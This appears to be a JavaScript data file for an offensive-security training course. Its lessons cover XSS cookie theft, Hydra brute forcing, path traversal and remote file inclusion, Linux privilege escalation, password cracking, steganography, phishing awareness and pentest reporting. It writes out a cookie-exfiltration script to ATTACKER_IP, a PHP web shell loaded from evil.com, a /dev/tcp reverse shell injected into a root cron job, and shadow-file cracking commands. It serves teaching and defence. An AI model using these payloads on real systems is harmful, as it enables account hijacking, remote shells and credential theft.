{title:"Cookie Stealing",steps:["XSS can steal session cookies","Send stolen cookies to attacker server","Use cookie to login as that user"],
cmd:[{t:"c",v:"Cookie stealing payload:"},{t:"out",v:"<script>document.location='http://ATTACKER_IP/?c='+document.cookie</script>"},{t:"cmd",v:"nc -lvnp 8888"},{t:"c",v:"When victim loads the page:"},{t:"out",v:"GET /?c=PHPSESSID=abc123xyz789 HTTP/1.1"},{t:"cmd",v:"curl -b 'PHPSESSID=abc123xyz789' http://target.com/account"}]},
{title:"XSS Defense",steps:["Output encoding: < becomes &lt;","Content Security Policy header","HttpOnly cookie flag","Input validation"],
cmd:[{t:"cmd",v:"curl -I https://target.com | grep -i content-security"},{t:"cmd",v:"curl -I http://target.com | grep -i 'set-cookie'"},{t:"out",v:"Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure"},{t:"c",v:"HttpOnly = JavaScript cannot read this cookie"}]}
],
hints:["If <script> filtered try: <img src=x onerror=alert(1)> — uses image error event","Stored XSS is most dangerous — affects EVERY user who visits"],
quiz:[{q:"Stored XSS type saved in database?",opts:["Reflected","DOM-based","Stored","Universal"],a:2},{q:"HttpOnly cookie flag does?",opts:["Encrypts cookie","Prevents JS reading cookie","Makes permanent","Blocks HTTPS"],a:1},{q:"Basic XSS test payload?",opts:["' OR 1=1 --","<script>alert(1)</script>","../../etc/passwd","admin'--"],a:1},{q:"CSP header helps prevent?",opts:["SQL injection","XSS attacks","Directory traversal","Brute force"],a:1},{q:"XSS cookie stealing sends cookies to?",opts:["Database","Victim browser","Attacker server","Web server"],a:2}],
assignment:{title:"XSS Testing",tasks:["Go to: http://testphp.vulnweb.com/search.php","Test for reflected XSS with different payloads","Try comment section for stored XSS","Check what security headers site has (or missing)","Write: type found, payload, and how to prevent"],submit:"Screenshot of XSS working + analysis and prevention advice"}},

{id:23,title:"Brute Force with Hydra",emoji:"🔑",subtitle:"Attack login systems with automated password guessing.",type:"system",phase:3,month:3,points:75,duration_mins:70,
intro:"If you can bypass authentication, you are in. Brute force tries many passwords automatically. Understanding this helps you attack weak systems and defend your own.",
sections:[
{title:"Types of Auth Attacks",steps:["Brute force = try every combination","Dictionary attack = try common passwords from wordlist","Credential stuffing = use real leaked passwords","Default credentials = manufacturer defaults"],
cmd:[{t:"c",v:"Brute force: 1234, 1235, 1236... slow but thorough"},{t:"c",v:"Dictionary: uses rockyou.txt list of common passwords"},{t:"c",v:"Credential stuffing: leaked password from other sites"},{t:"c",v:"Default creds: admin:admin admin:password root:root"}]},
{title:"Hydra Basics",steps:["Hydra is the main brute force tool","Works on many protocols: SSH, FTP, HTTP","Use -l for username, -P for password list"],
cmd:[{t:"cmd",v:"apt install -y hydra"},{t:"cmd",v:"hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh"},{t:"out",v:"[22][ssh] host: 192.168.1.1  login: admin  password: admin123"},{t:"cmd",v:"hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1"}]},
{title:"Wordlists",steps:["rockyou.txt is most famous","Contains millions of real leaked passwords","First 20 are most common"],
cmd:[{t:"cmd",v:"apt install -y wordlists"},{t:"cmd",v:"head -20 /usr/share/wordlists/rockyou.txt"},{t:"out",v:"123456\npassword\n12345678\nqwerty\n123456789\nabc123"},{t:"cmd",v:"echo -e 'admin\\npassword\\n1234\\nadmin1234' > custom.txt"}]},
{title:"Web Login Brute Force",steps:["Hydra can brute force web login forms","Needs: URL, POST data format, fail message"],
cmd:[{t:"cmd",v:"hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'"},{t:"c",v:"^USER^ = replaced with each username"},{t:"c",v:"^PASS^ = replaced with each password"},{t:"c",v:"Invalid credentials = fail message"}]}
],
hints:["Use -t 4 threads to avoid account lockout: hydra -t 4 ...","Always check default credentials first before brute force — saves time"],
quiz:[{q:"What attack uses leaked passwords from other sites?",opts:["Brute force","Dictionary attack","Credential stuffing","Rainbow table"],a:2},{q:"Most common default admin password?",opts:["12345678","qwerty","admin","letmein"],a:2},{q:"Hydra username flag?",opts:["-u","-l","-P","-n"],a:1},{q:"Best known wordlist?",opts:["common.txt","rockyou.txt","passwords.txt","biglist.txt"],a:1},{q:"Credential stuffing means?",opts:["Brute all combinations","Using leaked username/password pairs","Wordlist attack","Changing creds after login"],a:1}],
assignment:{title:"Authentication Testing",tasks:["Try default creds on a test login","Use Hydra to test SSH login on localhost","Create wordlist of 20 common passwords","Run Hydra with custom wordlist","Explain 3 ways to protect a login from brute force"],submit:"Hydra command and output + 3 protection methods"}},

{id:24,title:"File Inclusion and Path Traversal",emoji:"📁",subtitle:"Access files you should not be able to see.",type:"web",phase:3,month:3,points:75,duration_mins:65,
intro:"These vulnerabilities let you read files the application never intended to show. /etc/passwd, config files, private keys — all exposed through vulnerable parameters.",
sections:[
{title:"Path Traversal",steps:["../ goes up one directory","../../ goes up two directories","Add enough to reach /etc/passwd"],
cmd:[{t:"c",v:"Normal URL: /view.php?page=about.html"},{t:"c",v:"Traversal: /view.php?page=../../../etc/passwd"},{t:"cmd",v:"curl 'http://testphp.vulnweb.com/showimage.php?file=../../../etc/passwd'"},{t:"out",v:"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."},{t:"c",v:"Other files to try:"},{t:"c",v:"../../../etc/shadow (password hashes)"},{t:"c",v:"../../../etc/hosts (internal hostnames)"}]},
{title:"Local File Inclusion (LFI)",steps:["LFI includes and sometimes executes files","Server does: include(user_input.php)","Add ../ to escape to other directories"],
cmd:[{t:"c",v:"Normal: /page.php?file=about"},{t:"c",v:"Server does: include('pages/about.php')"},{t:"cmd",v:"curl 'http://target.com/page.php?file=../../../etc/passwd'"},{t:"c",v:"Null byte bypass (old PHP):"},{t:"cmd",v:"curl 'http://target.com/page.php?file=../../../etc/passwd%00'"}]},
{title:"Reading Config Files",steps:["Config files contain database credentials","wp-config.php is goldmine for WordPress","Apache and PHP configs reveal paths"],
cmd:[{t:"cmd",v:"curl 'http://target.com/page.php?file=../wp-config.php'"},{t:"c",v:"wp-config.php contains: DB_HOST DB_USER DB_PASSWORD"},{t:"cmd",v:"curl 'http://target.com/page.php?file=../../../etc/apache2/apache2.conf'"},{t:"cmd",v:"curl 'http://target.com/page.php?file=config.php'"}]},
{title:"Remote File Inclusion (RFI)",steps:["RFI includes a URL from the internet","If enabled, you can include your own PHP code","Rare on modern PHP but powerful when found"],
cmd:[{t:"cmd",v:"curl 'http://target.com/page.php?file=http://evil.com/test.txt'"},{t:"c",v:"If content appears = RFI works"},{t:"c",v:"Your shell to host:"},{t:"out",v:"<?php system($_GET['cmd']); ?>"},{t:"cmd",v:"curl 'http://target.com/page.php?file=http://yourip/shell.php&cmd=id'"},{t:"out",v:"uid=33(www-data)"}]}
],
hints:["If ../../../ does not work, try: ....//....//....// — bypasses some filters","Most valuable LFI files: wp-config.php, config.php, .env — often contain DB passwords"],
quiz:[{q:"../ means?",opts:["Go deeper","Go up one directory","Find files","Root"],a:1},{q:"LFI is?",opts:["Local File Inclusion — reading files from server","Large File Input","Login Form Injection","Linux File Interface"],a:0},{q:"wp-config.php contains?",opts:["Page layouts","Database credentials","Plugin list","User emails"],a:1},{q:"RFI is?",opts:["Reading files","Including remote URL as file","Refusing input","Remote FTP Injection"],a:1},{q:"How to prevent path traversal?",opts:["Use HTTPS","Validate and sanitize file paths, never use user input in include()","Rate limiting","Strong passwords"],a:1}],
assignment:{title:"File Inclusion Exercise",tasks:["Test http://testphp.vulnweb.com for path traversal","Try to read /etc/passwd","Try to read /etc/hosts","Document: URL, payload, and what you found","Explain how developers prevent this"],submit:"curl commands + output of files read + prevention explanation"}},

{id:25,title:"Linux Privilege Escalation",emoji:"⬆️",subtitle:"Go from normal user to root.",type:"system",phase:3,month:3,points:75,duration_mins:75,
intro:"You got access as a normal user. Now you need root. Privilege escalation is how you go from limited to full control. This is the most important skill in system hacking.",
sections:[
{title:"Check sudo Permissions",steps:["sudo -l is ALWAYS first command","See what you can run as root","GTFOBins shows how to abuse each binary"],
cmd:[{t:"cmd",v:"sudo -l"},{t:"out",v:"User malik may run:\n(ALL) NOPASSWD: /usr/bin/vim\n(ALL) NOPASSWD: /usr/bin/python3"},{t:"c",v:"If vim allowed as sudo:"},{t:"cmd",v:"sudo vim"},{t:"c",v:"Inside vim type: :!/bin/bash → get root shell"},{t:"c",v:"If python3 allowed:"},{t:"cmd",v:"sudo python3 -c 'import os; os.system(\"/bin/bash\")'"}]},
{title:"SUID Binaries",steps:["SUID = runs as owner regardless of who runs it","Root-owned SUID files can give root shell","Check GTFOBins for each one found"],
cmd:[{t:"cmd",v:"find / -perm -4000 -type f 2>/dev/null"},{t:"out",v:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/local/bin/custom"},{t:"c",v:"Normal: passwd, sudo, newgrp"},{t:"c",v:"Unusual: /usr/local/bin/custom → investigate!"},{t:"c",v:"If find is SUID: find . -exec /bin/sh \\; -quit"}]},
{title:"Writable Cron Jobs",steps:["Cron runs commands on a schedule as root","If cron script is world-writable, you can modify it","Add a command to run as root when it executes"],
cmd:[{t:"cmd",v:"crontab -l"},{t:"cmd",v:"cat /etc/crontab"},{t:"out",v:"*/5 * * * * root /opt/backup.sh"},{t:"cmd",v:"ls -la /opt/backup.sh"},{t:"out",v:"-rwxrwxrwx 1 root root backup.sh"},{t:"c",v:"World-writable! Add your command:"},{t:"cmd",v:"echo 'bash -i >& /dev/tcp/YOURIP/4444 0>&1' >> /opt/backup.sh"},{t:"cmd",v:"nc -lvnp 4444"},{t:"c",v:"Wait for cron to run → root shell arrives"}]},
{title:"LinPEAS",steps:["LinPEAS automates all privesc checks","RED = high chance of privesc","Download and run on target"],
cmd:[{t:"cmd",v:"wget https://github.com/carlospolop/PEASS-ng/releases/download/latest/linpeas.sh"},{t:"cmd",v:"chmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee output.txt"},{t:"c",v:"RED = immediate privesc vector"},{t:"c",v:"YELLOW = investigate further"},{t:"c",v:"Check red findings first"}]}
],
hints:["GTFOBins (gtfobins.github.io) — search any binary you find as SUID or sudo here","sudo -l is always first. Takes 1 second. Can immediately give root."],
quiz:[{q:"sudo -l shows?",opts:["Current user","Commands runnable as sudo","Installed tools","Running services"],a:1},{q:"SUID binary?",opts:["Auto-deletes","Runs as owner regardless of who runs it","System file","Backup file"],a:1},{q:"GTFOBins website?",opts:["exploit-db.com","gtfobins.github.io","crt.sh","shodan.io"],a:1},{q:"LinPEAS does?",opts:["Penetrates Linux","Automates privesc enumeration","Patches Linux","Scans networks"],a:1},{q:"World-writable cron scripts dangerous because?",opts:["Run too slowly","Any user can modify them to run as root","Use too much CPU","Cannot be stopped"],a:1}],
assignment:{title:"Privilege Escalation Research",tasks:["In Debian: run sudo -l","Run: find / -perm -4000 2>/dev/null","Check /etc/crontab","Download and run LinPEAS on your Debian","Write 3 privesc methods you found or know"],submit:"LinPEAS output and 3 privesc methods explained"}},

{id:26,title:"Password Cracking",emoji:"🔓",subtitle:"Crack hashed passwords with John the Ripper.",type:"system",phase:3,month:3,points:75,duration_mins:65,
intro:"Database dumps give you hashes not plain passwords. Cracking reverses the hash to find the original password. John the Ripper is the classic tool.",
sections:[
{title:"How Hashing Works",steps:["Hash is one-way — cannot be reversed","You guess and compare","Common types: MD5, SHA1, SHA256, bcrypt"],
cmd:[{t:"cmd",v:"echo -n 'password' | md5sum"},{t:"out",v:"5f4dcc3b5aa765d61d8327deb882cf99"},{t:"cmd",v:"echo -n 'password' | sha256sum"},{t:"out",v:"5e884898da28047151d0e56f8dc629277360791..."},{t:"c",v:"MD5: 5f4d... = 'password' ← cracked at crackstation.net"}]},
{title:"John the Ripper",steps:["john is the standard cracking tool","Give it hashes + wordlist","It tries each word and compares"],
cmd:[{t:"cmd",v:"apt install -y john"},{t:"cmd",v:"echo '5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt"},{t:"cmd",v:"john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt"},{t:"out",v:"password         (?)\n1g 0:00:00:01 DONE"},{t:"cmd",v:"john --show --format=raw-md5 hashes.txt"}]},
{title:"Cracking Linux /etc/shadow",steps:["shadow file has Linux password hashes","Combine with passwd for john","Needs root access to read shadow"],
cmd:[{t:"cmd",v:"cat /etc/shadow"},{t:"out",v:"root:$6$rounds=5000$salt$hash...:18921:0:99999"},{t:"c",v:"$6$ = SHA-512 crypt"},{t:"cmd",v:"unshadow /etc/passwd /etc/shadow > combined.txt"},{t:"cmd",v:"john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt"}]},
{title:"Why Some Crack Fast and Some Never",steps:["Short passwords crack in seconds","Common words crack in seconds","Long random passwords take forever","bcrypt is designed to be slow"],
cmd:[{t:"c",v:"Cracks in SECONDS: 123456 password qwerty"},{t:"c",v:"Cracks in HOURS: 8-char mixed passwords"},{t:"c",v:"Never cracks: h7@kP9#mQ2xR5 (long random)"},{t:"c",v:"Rule: min 12 chars + special + no words"},{t:"c",v:"Quick online MD5 cracker: https://crackstation.net"}]}
],
hints:["Use --format= to specify hash type. Wrong detection = no cracks. raw-md5, raw-sha1, sha256crypt","Online crackers: crackstation.net — paste MD5/SHA1 hash, get answer instantly if common"],
quiz:[{q:"Password hashing?",opts:["Encrypting password","One-way transformation cannot be reversed","Storing plaintext","Compressing"],a:1},{q:"john --show does?",opts:["Show options","Show cracked passwords","Show hash types","Show jobs"],a:1},{q:"$6$ in shadow means?",opts:["MD5","SHA-1","SHA-512","Bcrypt"],a:2},{q:"Linux password hashes in?",opts:["/etc/passwd","/etc/users","/etc/shadow","/etc/hashes"],a:2},{q:"Command to combine passwd and shadow?",opts:["merge-shadow","combine","unshadow","join"],a:2}],
assignment:{title:"Password Cracking Exercise",tasks:["Create MD5 hashes for 5 passwords using md5sum","Put them in hashes.txt and crack with john + rockyou.txt","Create hash for strong 12-char password — try to crack it","Note: instant crack vs slow vs never cracked","Write what makes a password hard to crack"],submit:"john output and analysis of weak vs strong passwords"}},

{id:27,title:"Steganography",emoji:"🎭",subtitle:"Find hidden data inside images and files.",type:"web",phase:3,month:3,points:75,duration_mins:60,
intro:"Steganography hides data inside other files. Images can contain secret messages. This is used in CTF competitions and real investigations.",
sections:[
{title:"steghide",steps:["steghide hides data inside JPEG images","Can also extract hidden data","Try empty password first"],
cmd:[{t:"cmd",v:"apt install -y steghide"},{t:"cmd",v:"echo 'FLAG{hidden}' > secret.txt"},{t:"cmd",v:"steghide embed -cf image.jpg -sf secret.txt"},{t:"out",v:"Enter passphrase: [type password]\nembedding secret.txt in image.jpg... done."},{t:"cmd",v:"steghide extract -sf image.jpg"},{t:"out",v:"Enter passphrase:\nwrote extracted data to secret.txt"},{t:"cmd",v:"steghide extract -sf image.jpg -p ''"}]},
{title:"binwalk",steps:["binwalk finds files hidden inside other files","Extracts them automatically","Very useful for CTF"],
cmd:[{t:"cmd",v:"apt install -y binwalk"},{t:"cmd",v:"binwalk image.jpg"},{t:"out",v:"0       JPEG image\n12480   Zip archive data: secret.txt"},{t:"cmd",v:"binwalk -e image.jpg"},{t:"cmd",v:"ls _image.jpg.extracted/"},{t:"out",v:"30C0.zip  secret.txt"}]},
{title:"exiftool — Metadata",steps:["Files contain hidden metadata","GPS location, camera model, author name","Very useful for OSINT"],
cmd:[{t:"cmd",v:"apt install -y exiftool"},{t:"cmd",v:"exiftool image.jpg"},{t:"out",v:"Camera Model: iPhone 13 Pro\nGPS Latitude: 6° 27' 17.40\" N\nGPS Longitude: 3° 24' 27.60\" E\nAuthor: malik"},{t:"c",v:"GPS = where the photo was taken"}]},
{title:"strings",steps:["strings extracts all readable text from any file","Fastest first check on any unknown file","Look for flags, passwords, clues"],
cmd:[{t:"cmd",v:"strings image.jpg"},{t:"out",v:"JFIF\nFLAG{in_strings}"},{t:"cmd",v:"strings image.jpg | grep -i 'flag\\|password\\|secret'"},{t:"cmd",v:"strings -n 10 image.jpg"}]}
],
hints:["Always try steghide with empty password first: -p '' — many CTF images forget a password","strings is the quickest first check. Run it immediately on any unknown file."],
quiz:[{q:"Steganography is?",opts:["Encrypting files","Hiding data inside other files","Password cracking","Network scanning"],a:1},{q:"binwalk does?",opts:["Open ports","Detect and extract hidden files inside files","Crack passwords","Scan websites"],a:1},{q:"exiftool reads?",opts:["Encrypted data","File metadata","Hidden ZIP files","Network packets"],a:1},{q:"strings does?",opts:["Lists processes","Extracts printable text from any file","Converts images","Encrypts strings"],a:1},{q:"steghide extract flag?",opts:["embed","extract","info","list"],a:1}],
assignment:{title:"Steganography Challenge",tasks:["Download any JPEG from internet","Use steghide to hide: FLAG{your_name} inside it","Extract it back and confirm works","Use exiftool to read metadata","Use strings on the image and look for text"],submit:"Screenshots of all 4 steps"}},

{id:28,title:"Phishing Awareness",emoji:"🎣",subtitle:"How attackers trick people — and how to recognize it.",type:"web",phase:3,month:3,points:75,duration_mins:65,
intro:"The most dangerous hacking tool is a convincing email. Most real attacks start with phishing. Understanding how it works helps you recognize and defend against it.",
sections:[
{title:"How Phishing Works",steps:["Attacker creates fake login page","Registers convincing fake domain","Sends email with urgent message","Victim clicks and enters credentials","Credentials go to attacker server"],
cmd:[{t:"c",v:"Fake domains that fool people:"},{t:"c",v:"gmai1.com (number 1 instead of l)"},{t:"c",v:"gmail-security.com"},{t:"c",v:"paypaI.com (capital I looks like l)"},{t:"c",v:"Email says: Your account will be suspended."},{t:"c",v:"Victim enters creds → attacker gets them"},{t:"c",v:"Victim redirected to real site → suspects nothing"}]},
{title:"Types of Social Engineering",steps:["Phishing = email to many people","Spear phishing = targeted with personal info","Vishing = voice call","Smishing = SMS","Pretexting = believable fake story"],
cmd:[{t:"c",v:"PHISHING: Dear customer, click here..."},{t:"c",v:"SPEAR: Hi Malik, here is Monday's invoice"},{t:"c",v:"VISHING: This is your bank's fraud team"},{t:"c",v:"SMISHING: Your package held, click to release"},{t:"c",v:"BAITING: USB in car park labeled 'Salary 2024'"}]},
{title:"How to Recognize Phishing",steps:["Urgency: Act now or lose account","Sender looks wrong: support@gma1l-security.net","Hover shows different URL than displayed","Generic greeting: Dear Valued Customer","Unexpected attachment"],
cmd:[{t:"c",v:"Before clicking any suspicious link:"},{t:"cmd",v:"curl -I 'https://suspicious-link.com'"},{t:"c",v:"Check reputation at:"},{t:"c",v:"https://www.virustotal.com"},{t:"c",v:"https://urlscan.io"}]},
{title:"Protection",steps:["Verify sender domain carefully","Never enter credentials from email links","Check URL in address bar before typing","Use MFA on all accounts","Report suspicious emails to IT"],
cmd:[{t:"c",v:"Company policies to reduce phishing risk:"},{t:"c",v:"1. Security awareness training for all staff"},{t:"c",v:"2. Email filtering with spam detection"},{t:"c",v:"3. MFA on all accounts"},{t:"c",v:"4. Report button in email client"},{t:"c",v:"5. Incident response plan for when it works"}]}
],
hints:["Spear phishing is 10x more effective because it is personalized. Attackers research on LinkedIn first.","Check URLs at virustotal.com or urlscan.io — copy URL, do not click it"],
quiz:[{q:"Spear phishing differs from phishing by?",opts:["Better technology","Targets specific person with personal info","Only via phone","Only via SMS"],a:1},{q:"Before clicking suspicious link?",opts:["Click to see","Forward to friends","Check at virustotal.com","Delete and forget"],a:2},{q:"Vishing is?",opts:["Video phishing","Voice call social engineering","Virus in email","Visual phishing"],a:1},{q:"Legitimate companies never ask for?",opts:["Your name","Order number","Password via email","Address"],a:2},{q:"Baiting uses?",opts:["Fake prizes","Infected USB drives for people to find","Mass emails","Fake IT support"],a:1}],
assignment:{title:"Phishing Awareness Report",tasks:["Find real phishing email example online","Identify 5 red flags in it","Check 2 URLs at virustotal.com, screenshot results","Write: how to explain phishing to non-technical person","List 3 company policies to reduce phishing risk"],submit:"Your phishing analysis + plain English explanation + 3 policies"}},

{id:29,title:"Writing a Pentest Report",emoji:"📝",subtitle:"Document findings like a real professional.",type:"web",phase:3,month:3,points:75,duration_mins:60,
intro:"You found vulnerabilities. Now what? A report is what clients use to fix their problems. Technical skills get the findings. Report skills get you paid.",
sections:[
{title:"Report Structure",steps:["1. Cover page","2. Table of contents","3. Executive summary (for management)","4. Scope and methodology","5. Findings","6. Recommendations","7. Appendix"],
cmd:[{t:"c",v:"EXECUTIVE SUMMARY: plain English, 1-2 pages"},{t:"c",v:"FINDINGS: each vulnerability its own section"},{t:"c",v:"RECOMMENDATIONS: specific steps to fix"},{t:"c",v:"APPENDIX: screenshots and tool output"}]},
{title:"Writing Each Finding",steps:["Title, Severity, CVSS Score","Description in plain English","Steps to reproduce","Impact — what can attacker do","Recommendation — how to fix"],
cmd:[{t:"c",v:"FINDING: SQL Injection in Login Form"},{t:"c",v:"Severity: CRITICAL — CVSS: 9.8/10"},{t:"c",v:""},{t:"c",v:"Description: Login form is SQL injectable."},{t:"c",v:"Attacker can bypass auth without password."},{t:"c",v:""},{t:"c",v:"Steps: 1. Go to /login.php"},{t:"c",v:"2. Enter username: admin'-- and any password"},{t:"c",v:"3. You are logged in"},{t:"c",v:""},{t:"c",v:"Impact: Access all accounts including admin."},{t:"c",v:""},{t:"c",v:"Fix: Use prepared statements."}]},
{title:"CVSS Scoring",steps:["CVSS = standard 0-10 severity score","9.0-10.0 = Critical","7.0-8.9 = High","4.0-6.9 = Medium","0.1-3.9 = Low"],
cmd:[{t:"c",v:"https://www.first.org/cvss/calculator/3.1"},{t:"c",v:""},{t:"c",v:"Score increases when:"},{t:"c",v:"No auth needed"},{t:"c",v:"Remote exploitable (over internet)"},{t:"c",v:"High impact on data"},{t:"c",v:""},{t:"c",v:"SQL injection on public login: 9.8 CRITICAL"},{t:"c",v:"Missing X-Frame-Options: 4.3 MEDIUM"}]},
{title:"Executive Summary Template",steps:["Written for management — no tech jargon","Clear business risk language","Action items with priority"],
cmd:[{t:"c",v:"Testing was done on company.com from DATE to DATE."},{t:"c",v:"We found 14 vulnerabilities:"},{t:"c",v:"  2 Critical (fix within 24 hours)"},{t:"c",v:"  3 High (fix within 1 week)"},{t:"c",v:"  5 Medium (fix within 30 days)"},{t:"c",v:"  4 Low (fix within 90 days)"},{t:"c",v:""},{t:"c",v:"Most serious: SQL injection in login page."},{t:"c",v:"This lets anyone access all customer data."},{t:"c",v:"Fix this immediately."}]}
],
hints:["Write executive summary LAST — after you know all findings","Include screenshots of every step. A finding with no proof is hard to take seriously."],
quiz:[{q:"Executive summary written for?",opts:["Technical team","Developers","Management and non-technical staff","Other hackers"],a:2},{q:"CVSS Critical range?",opts:["5.0-7.0","7.0-8.9","9.0-10.0","6.0-9.0"],a:2},{q:"Proof of finding includes?",opts:["CVSS score only","Written description only","Screenshots of exploitation","Client email"],a:2},{q:"Technical details are in?",opts:["Executive Summary","Appendix","Findings","Recommendations"],a:2},{q:"SQL injection in plain English for manager?",opts:["Binary heap overflow","Anyone can access all customer data without password","OWASP Top 10 issue","Memory corruption"],a:1}],
assignment:{title:"Write Your First Pentest Report",tasks:["Use findings from Level 20 or earlier levels","Write complete report with all 7 sections","Executive summary in plain English","Document at least 3 findings with CVSS scores","For each: description, steps, impact, fix"],submit:"Complete pentest report as text file"}},

{id:30,title:"Final Red Team Exercise",emoji:"🏆",subtitle:"One complete engagement. Start to finish.",type:"web",phase:3,month:3,points:100,duration_mins:120,
intro:"Level 30. 3 months of training. Now do one complete red team engagement — recon, scanning, exploitation, and a full professional report. This is your graduation.",
sections:[
{title:"Phase 1 — Passive Recon",steps:["Set up workspace","Run whois and dig","Find subdomains"],
cmd:[{t:"cmd",v:"mkdir -p ~/final/{recon,ports,web,reports}"},{t:"cmd",v:"TARGET='testphp.vulnweb.com'"},{t:"cmd",v:"whois $TARGET > recon/whois.txt"},{t:"cmd",v:"dig $TARGET ANY > recon/dns.txt"},{t:"cmd",v:"sublist3r -d $TARGET -o recon/subs.txt"}]},
{title:"Phase 2 — Active Scanning",steps:["Run nmap full scan","Fingerprint the web app","Run automated scanners"],
cmd:[{t:"cmd",v:"nmap -sV -A -p- $TARGET -oN ports/nmap.txt"},{t:"cmd",v:"whatweb $TARGET > web/whatweb.txt"},{t:"cmd",v:"nikto -h http://$TARGET -o web/nikto.txt"},{t:"cmd",v:"gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o web/dirs.txt"}]},
{title:"Phase 3 — Manual Testing",steps:["Test for SQL injection","Test for XSS","Test for path traversal","Document all findings"],
cmd:[{t:"cmd",v:"sqlmap -u 'http://$TARGET/listproducts.php?cat=1' --dbs --output-dir=web/sqlmap/"},{t:"cmd",v:"curl -s 'http://$TARGET/search.php?test=<script>alert(1)</script>' | grep script"},{t:"cmd",v:"curl 'http://$TARGET/showimage.php?file=../../../etc/passwd'"}]},
{title:"Phase 4 — Write the Report",steps:["Cover page, executive summary, findings","CVSS score for each vulnerability","Screenshots as proof","Recommendations to fix everything"],
cmd:[{t:"c",v:"Your report must include:"},{t:"c",v:"1. Cover page (your name, date, target)"},{t:"c",v:"2. Executive summary (plain English)"},{t:"c",v:"3. Methodology (tools used)"},{t:"c",v:"4. All findings with CVSS scores"},{t:"c",v:"5. Screenshots proving each finding"},{t:"c",v:"6. Fix recommendation for each"},{t:"c",v:""},{t:"ok",v:"CONGRATULATIONS — Level 30 Complete"},{t:"ok",v:"You went from zero to Red Team Operative."}]}
],
hints:["Quality over quantity. 3 well-documented proven findings beat 10 guesses.","Organize notes from all 30 levels. Your final report builds on everything you did."],
quiz:[{q:"First phase of red team engagement?",opts:["Exploitation","Reporting","Passive recon","Scanning"],a:2},{q:"After finding a vulnerability?",opts:["Keep secret","Exploit everything","Document for report","Tell victim immediately"],a:2},{q:"A complete engagement ends with?",opts:["A shell","A professional report","CVE disclosure","New tool"],a:1},{q:"SQLMap automates?",opts:["XSS","Directory busting","SQL injection","Port scanning"],a:2},{q:"After completing 30 levels what next?",opts:["Stop learning","Practice more labs, get certifications","Delete all tools","Hack random sites"],a:1}],
assignment:{title:"FINAL GRADUATION EXERCISE",tasks:["Complete all 4 phases","Full report with all 7 sections","Minimum 5 documented findings with CVSS","All screenshots included","Executive summary in plain English"],submit:"Complete final report — this is your graduation assignment"}}
];

function getLessonById(id){return LESSONS.find(l=>l.id===id)||null;}
function getLessonsByPhase(p){return LESSONS.filter(l=>l.phase===p);}
function getLessonsByMonth(m){return LESSONS.filter(l=>l.month===m);}
